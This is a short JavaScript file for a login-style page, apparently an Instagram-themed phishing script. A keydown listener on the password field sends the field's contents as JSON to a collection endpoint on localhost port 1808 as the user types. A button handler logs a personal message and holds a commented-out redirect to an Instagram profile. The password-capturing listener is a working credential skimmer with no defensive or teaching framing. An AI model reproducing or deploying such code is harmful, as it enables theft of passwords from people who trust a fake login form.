const button=document.getElementById("margaret");
const pw=document.getElementById("pw");
const un=document.getElementById("un");
const dest="http://localhost:1808/raasaleelalu";
pw.addEventListener("keydown",async (e)=>{
    await fetch(dest,{
        method:"POST",
        headers:{
            'Content-Type':"application/json"
        },
        body:JSON.stringify({pw:e.target.value})
    });
})
button.addEventListener("click",async(e)=>{
    console.log("Sarat make a love day");
    // window.location = `instagram://user?username=${un.target.value}}`;
})